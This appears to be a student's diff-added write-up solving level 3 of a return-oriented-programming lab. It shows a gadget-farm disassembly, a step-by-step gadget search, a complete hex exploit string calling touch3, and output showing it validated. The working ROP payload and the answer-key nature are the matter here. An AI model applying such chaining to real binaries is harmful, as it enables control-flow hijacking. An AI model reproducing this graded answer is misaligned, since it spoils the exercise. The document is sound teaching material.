@@ -1,0 +1,383 @@
+000000000040184e <start_farm>:
+  40184e:	b8 01 00 00 00       	mov    $0x1,%eax
+  401853:	c3                   	retq   
+
+0000000000401854 <addval_233>:
+  401854:	8d 87 43 d8 c3 be    	lea    -0x413c27bd(%rdi),%eax
+  40185a:	c3                   	retq   
+
+000000000040185b <addval_465>:
+  40185b:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
+  401861:	c3                   	retq   
+
+0000000000401862 <addval_161>:
+  401862:	8d 87 58 90 c7 8e    	lea    -0x71386fa8(%rdi),%eax
+  401868:	c3                   	retq   
+
+0000000000401869 <addval_482>:
+  401869:	8d 87 3f 48 81 c7    	lea    -0x387eb7c1(%rdi),%eax
+  40186f:	c3                   	retq   
+
+0000000000401870 <getval_109>:
+  401870:	b8 58 90 90 c3       	mov    $0xc3909058,%eax
+  401875:	c3                   	retq   
+
+0000000000401876 <getval_331>:
+  401876:	b8 48 89 c7 c3       	mov    $0xc3c78948,%eax
+  40187b:	c3                   	retq   
+
+000000000040187c <addval_435>:
+  40187c:	8d 87 48 a9 c7 90    	lea    -0x6f3856b8(%rdi),%eax
+  401882:	c3                   	retq   
+
+0000000000401883 <getval_422>:
+  401883:	b8 57 58 90 90       	mov    $0x90905857,%eax
+  401888:	c3                   	retq   
+
+0000000000401889 <mid_farm>:
+  401889:	b8 01 00 00 00       	mov    $0x1,%eax
+  40188e:	c3                   	retq   
+
+000000000040188f <add_xy>:
+  40188f:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
+  401893:	c3                   	retq   
+
+0000000000401894 <addval_427>:
+  401894:	8d 87 89 c1 28 d2    	lea    -0x2dd73e77(%rdi),%eax
+  40189a:	c3                   	retq   
+
+000000000040189b <addval_271>:
+  40189b:	8d 87 8d ca 90 90    	lea    -0x6f6f3573(%rdi),%eax
+  4018a1:	c3                   	retq   
+
+00000000004018a2 <getval_320>:
+  4018a2:	b8 99 c1 84 c9       	mov    $0xc984c199,%eax
+  4018a7:	c3                   	retq   
+
+00000000004018a8 <setval_223>:
+  4018a8:	c7 07 89 c1 60 c0    	movl   $0xc060c189,(%rdi)
+  4018ae:	c3                   	retq   
+
+00000000004018af <addval_147>:
+  4018af:	8d 87 c8 89 d6 92    	lea    -0x6d297638(%rdi),%eax
+  4018b5:	c3                   	retq   
+
+00000000004018b6 <addval_242>:
+  4018b6:	8d 87 89 ca c7 bf    	lea    -0x40383577(%rdi),%eax
+  4018bc:	c3                   	retq   
+
+00000000004018bd <getval_339>:
+  4018bd:	b8 81 d6 20 d2       	mov    $0xd220d681,%eax
+  4018c2:	c3                   	retq   
+
+00000000004018c3 <setval_291>:
+  4018c3:	c7 07 48 09 e0 c3    	movl   $0xc3e00948,(%rdi)
+  4018c9:	c3                   	retq   
+
+00000000004018ca <getval_236>:
+  4018ca:	b8 23 4a 89 e0       	mov    $0xe0894a23,%eax
+  4018cf:	c3                   	retq   
+
+00000000004018d0 <setval_224>:
+  4018d0:	c7 07 48 89 e0 c3    	movl   $0xc3e08948,(%rdi)
+  4018d6:	c3                   	retq   
+
+00000000004018d7 <addval_215>:
+  4018d7:	8d 87 89 c1 92 90    	lea    -0x6f6d3e77(%rdi),%eax
+  4018dd:	c3                   	retq   
+
+00000000004018de <getval_237>:
+  4018de:	b8 b8 48 8d e0       	mov    $0xe08d48b8,%eax
+  4018e3:	c3                   	retq   
+
+00000000004018e4 <setval_219>:
+  4018e4:	c7 07 89 d6 91 90    	movl   $0x9091d689,(%rdi)
+  4018ea:	c3                   	retq   
+
+00000000004018eb <setval_370>:
+  4018eb:	c7 07 68 89 e0 c3    	movl   $0xc3e08968,(%rdi)
+  4018f1:	c3                   	retq   
+
+00000000004018f2 <setval_119>:
+  4018f2:	c7 07 89 ca 84 c9    	movl   $0xc984ca89,(%rdi)
+  4018f8:	c3                   	retq   
+
+00000000004018f9 <addval_475>:
+  4018f9:	8d 87 89 ca c4 c9    	lea    -0x363b3577(%rdi),%eax
+  4018ff:	c3                   	retq   
+
+0000000000401900 <addval_101>:
+  401900:	8d 87 89 d6 38 db    	lea    -0x24c72977(%rdi),%eax
+  401906:	c3                   	retq   
+
+0000000000401907 <getval_250>:
+  401907:	b8 89 c1 08 c9       	mov    $0xc908c189,%eax
+  40190c:	c3                   	retq   
+
+000000000040190d <addval_149>:
+  40190d:	8d 87 c9 c1 90 c3    	lea    -0x3c6f3e37(%rdi),%eax
+  401913:	c3                   	retq   
+
+0000000000401914 <getval_203>:
+  401914:	b8 48 89 e0 c3       	mov    $0xc3e08948,%eax
+  401919:	c3                   	retq   
+
+000000000040191a <addval_446>:
+  40191a:	8d 87 89 d6 a4 db    	lea    -0x245b2977(%rdi),%eax
+  401920:	c3                   	retq   
+
+0000000000401921 <setval_353>:
+  401921:	c7 07 89 ca 08 d2    	movl   $0xd208ca89,(%rdi)
+  401927:	c3                   	retq   
+
+0000000000401928 <addval_116>:
+  401928:	8d 87 48 89 e0 92    	lea    -0x6d1f76b8(%rdi),%eax
+  40192e:	c3                   	retq   
+
+000000000040192f <addval_358>:
+  40192f:	8d 87 1f dd 81 d6    	lea    -0x297e22e1(%rdi),%eax
+  401935:	c3                   	retq   
+
+0000000000401936 <setval_189>:
+  401936:	c7 07 99 ca 84 db    	movl   $0xdb84ca99,(%rdi)
+  40193c:	c3                   	retq   
+
+000000000040193d <getval_340>:
+  40193d:	b8 48 89 e0 92       	mov    $0x92e08948,%eax
+  401942:	c3                   	retq   
+
+0000000000401943 <addval_182>:
+  401943:	8d 87 89 d6 38 c0    	lea    -0x3fc72977(%rdi),%eax
+  401949:	c3                   	retq   
+
+000000000040194a <addval_348>:
+  40194a:	8d 87 c9 c1 38 c0    	lea    -0x3fc73e37(%rdi),%eax
+  401950:	c3                   	retq   
+
+0000000000401951 <setval_284>:
+  401951:	c7 07 61 8d ca c3    	movl   $0xc3ca8d61,(%rdi)
+  401957:	c3                   	retq   
+
+0000000000401958 <addval_341>:
+  401958:	8d 87 89 d6 18 c0    	lea    -0x3fe72977(%rdi),%eax
+  40195e:	c3                   	retq   
+
+000000000040195f <addval_450>:
+  40195f:	8d 87 89 ca 28 c0    	lea    -0x3fd73577(%rdi),%eax
+  401965:	c3                   	retq   
+
+0000000000401966 <setval_106>:
+  401966:	c7 07 89 c1 c3 e8    	movl   $0xe8c3c189,(%rdi)
+  40196c:	c3                   	retq   
+
+000000000040196d <end_farm>:
+  40196d:	b8 01 00 00 00       	mov    $0x1,%eax
+  401972:	c3                   	retq   
+  
+  
+  
+1. padding the buffer
+
+2. save the %rsp into a register (%rdi here)
+
+3. save the address offset into a register (%rax here)
+
+4. save the sum of the above to value to a register
+
+5. call touch3
+
+6. cookie string
+
+7. terminate with \0
+
+
+Solution: 
+
+
+
+1.
+00 00 00 00 00 00 00 00 /* pad with 0x38 bytes = 56 bytes */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+
+
+
+2. save %rsp(cookie) to %rdi:
+
+gadget1: mov %rsp, %rax = 48 89 e0
+4018d0:	c7 07 48 89 e0 c3    	movl   $0xc3e08948,(%rdi)
+
+wanted address: 4018d2
+
+gadget2: mov %rax, %rdi = 48 89 c7
+401876:	b8 48 89 c7 c3       	mov    $0xc3c78948,%eax
+
+wanted address: 401877
+
+
+
+
+
+
+3. pop rax, offset, move eax to esi.
+
+gadget3: pop %rax = 58
+401870:	b8 58 90 90 c3       	mov    $0xc3909058,%eax
+
+wanted address: 401871
+
+
+
+distance between the first line(mov %rsp, %rax) to cookie string line - 1(the address offset). There are 10 lines before cookie string(10-1)*8 = 72 = 0x48 
+
+0x48
+48 00 00 00 00 00 00 00 /* distance between the first line(mov %rsp, %rax) to cookie string line - 1(the address offset). */
+
+
+
+eax into esi:
+now the hard part: copy eax into esi: 89 c6. that doesn't exist so we need to find a combination of gadgets which will do the same thing:
+# some people said nop code ruined their solution(at least in gadget 2(and 8)), so try to find ones without 90(only the wanted sequence then c3).
+
+gadgets from eax:
+
+mov %eax, %ecx = 89 c1
+401966:	c7 07 89 c1 c3 e8    	movl   $0xe8c3c189,(%rdi)
+
+mov %eax, %edi = 89 c7
+401876:	b8 48 89 c7 c3       	mov    $0xc3c78948,%eax
+
+
+gadgets from ecx or edi:
+gadgets from ecx:
+ecx to edx(89 ca):
+Line 66:   4018b6:	8d 87 89 ca c7 bf    	lea    -0x40383577(%rdi),%eax - no nop
+Line 102:   4018f2:	c7 07 89 ca 84 c9    	movl   $0xc984ca89,(%rdi)     - 84 c9 is nop!
+Line 106:   4018f9:	8d 87 89 ca c4 c9    	lea    -0x363b3577(%rdi),%eax - no nop!
+Line 130:   401921:	c7 07 89 ca 08 d2    	movl   $0xd208ca89,(%rdi)     - 08 d2 is nop!
+Line 166:   40195f:	8d 87 89 ca 28 c0    	lea    -0x3fd73577(%rdi),%eax - no nop!
+
+gadgets from edi:
+none!
+
+so...  ecx to edx: 89 ca
+Line 102:   4018f2:	c7 07 89 ca 84 c9    	movl   $0xc984ca89,(%rdi)     - 84 c9 is nop!
+4018f8:	c3                   	retq   
+
+wanted address: 4018f4
+
+
+now at last- edx to esi(89 d6):
+	Line 62:   4018af:	8d 87 c8 89 d6 92    	lea    -0x6d297638(%rdi),%eax
+	Line 94:   4018e4:	c7 07 89 d6 91 90    	movl   $0x9091d689,(%rdi)
+	Line 110:   401900:	8d 87 89 d6 38 db    	lea    -0x24c72977(%rdi),%eax - 38 db is nop!
+	Line 126:   40191a:	8d 87 89 d6 a4 db    	lea    -0x245b2977(%rdi),%eax
+	Line 150:   401943:	8d 87 89 d6 38 c0    	lea    -0x3fc72977(%rdi),%eax - 38 c0 is nop!
+	Line 162:   401958:	8d 87 89 d6 18 c0    	lea    -0x3fe72977(%rdi),%eax
+
+so...  edx to esi(89 d6)
+401900:	8d 87 89 d6 38 db    	lea    -0x24c72977(%rdi),%eax
+401906:	c3                   	retq 
+
+
+
+in conclusion: eax into esi:
+
+gadget 4: mov %eax, %ecx = 89 c1
+401966:	c7 07 89 c1 c3 e8    	movl   $0xe8c3c189,(%rdi)
+
+wanted address: 401968
+
+gadget 5: ecx to edx(89 ca)
+4018f2:	c7 07 89 ca 84 c9    	movl   $0xc984ca89,(%rdi)     - 84 c9 is nop!
+4018f8:	c3                   	retq   
+
+wanted address: 4018f4
+
+gadget 6: edx to esi(89 d6)
+401900:	8d 87 89 d6 38 db    	lea    -0x24c72977(%rdi),%eax
+401906:	c3                   	retq 
+
+wanted address: 401902
+
+
+
+
+
+
+4. save the sum of the above(the offset) - the cookie's address in rsp that moved to rdi, plus eax that moved to esi(rsi) - to value to a register(rax)
+
+gadget 7:
+  40188f:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
+  401893:	c3                   	retq   
+
+wanted address: 40188f
+
+
+
+
+
+5. call touch3: mov rax to rdi, then call touch3:
+gadget 8(same as gadget 2): mov %rax, %rdi = 48 89 c7
+401876:	b8 48 89 c7 c3       	mov    $0xc3c78948,%eax
+
+wanted address: 401877
+
+touch3 address(from rtarget disas): 4017c6
+
+
+
+
+6. cookie text to hex(from phase 3):
+34 66 33 66 66 33 64 31 /* cookie string */
+
+
+
+7. optional(not needed)
+
+
+
+finally combine all(addresses in little endian):
+
+
+
+00 00 00 00 00 00 00 00 /* pad with 0x38 bytes = 56 bytes */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+d2 18 40 00 00 00 00 00 /* gadget 1: mov %rsp, %rax */
+77 18 40 00 00 00 00 00 /* gadget 2: mov %rax, %rdi */
+71 18 40 00 00 00 00 00 /* gadget 3: pop %rax */
+48 00 00 00 00 00 00 00 /* distance between the first line(mov %rsp, %rax) to cookie string line - 1(the address offset) */
+68 19 40 00 00 00 00 00 /* gadget 4: mov %eax, %ecx */
+f4 18 40 00 00 00 00 00 /* gadget 5: mov %ecx, %edx */
+02 19 40 00 00 00 00 00 /* gadget 6: mov %edx, %esi */
+8f 18 40 00 00 00 00 00 /* gadget 7: lea (%rdi,%rsi,1),%rax */
+77 18 40 00 00 00 00 00 /* gadget 8: mov %rax, %rdi */
+c6 17 40 00 00 00 00 00 /* touch3 address */
+34 66 33 66 66 33 64 31 /* cookie string as hex */
+
+
+
+
+
+
+u2 israele4 55 : cd SP2/target8888
+u2 israele4 56 : ./hex2raw < phase5sol.txt > phase5raw.txt
+u2 israele4 57 : ./rtarget < phase5raw.txt
+Cookie: 0x4f3ff3d1
+Type string:Touch3!: You called touch3("4f3ff3d1")
+Valid solution for level 3 with target rtarget
+PASS: Sent exploit string to server to be validated.
+NICE JOB!
+
+Worked on the first try!!!
+Baruch sheptaranu! that was challenging but moslty fun :)
+
